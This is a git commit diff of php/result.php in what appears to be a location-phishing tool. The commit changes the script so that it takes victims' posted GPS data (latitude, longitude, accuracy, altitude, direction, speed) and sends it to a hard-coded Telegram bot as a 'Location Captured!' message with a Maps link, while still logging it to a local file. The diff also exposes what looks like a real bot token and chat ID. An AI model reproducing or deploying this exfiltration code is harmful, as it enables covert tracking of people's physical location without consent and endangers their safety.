dd8d4ded575e65062858319a0b5f77321edb0af7
Sohail <76439991+asxhail@users.noreply.github.com>
2026-01-19 01:32:30 +0530

    Refactor result.php to send location data to Telegram
    Refactored code to capture location data and send it to Telegram. Added configuration for bot token and chat ID.

--- php/result.php
+++ php/result.php
@@ -1,27 +1,28 @@
 <?php
 header('Content-Type: text/html');
-{
-  $ok_status = $_POST['Status'];
-  $lat = $_POST['Lat'];
-  $lon = $_POST['Lon'];
-  $acc = $_POST['Acc'];
-  $alt = $_POST['Alt'];
-  $dir = $_POST['Dir'];
-  $spd = $_POST['Spd'];
 
-  $data = array(
-    'status' => $ok_status,
-    'lat' => $lat,
-    'lon' => $lon,
-    'acc' => $acc,
-    'alt' => $alt,
-    'dir' => $dir,
-    'spd' => $spd);
+// --- YOUR CONFIG ---
+$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
+$chatId = "6862649950";
 
-  $json_data = json_encode($data);
+// 1. Capture Data
+$lat = $_POST['Lat']; $lon = $_POST['Lon']; $acc = $_POST['Acc'];
+$alt = $_POST['Alt']; $dir = $_POST['Dir']; $spd = $_POST['Spd'];
 
-  $f = fopen('../../logs/result.txt', 'w+');
-  fwrite($f, $json_data);
-  fclose($f);
-}
+// 2. Format Telegram Message
+$maps = "https://www.google.com/maps/place/$lat+$lon";
+$msg = "*Location Captured!* \n\n" .
+       "Lat: $lat\nLon: $lon\nAcc: $acc m\n" .
+       "Alt: $alt\nDir: $dir\nSpd: $spd\n\n" .
+       "[View on Google Maps]($maps)";
+
+// 3. Send to Telegram
+$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
+file_get_contents($url);
+
+// 4. Save Locally
+$data = array('lat'=>$lat, 'lon'=>$lon, 'acc'=>$acc, 'alt'=>$alt, 'dir'=>$dir, 'spd'=>$spd);
+$f = fopen('../../logs/result.txt', 'w+');
+fwrite($f, json_encode($data));
+fclose($f);
 ?>
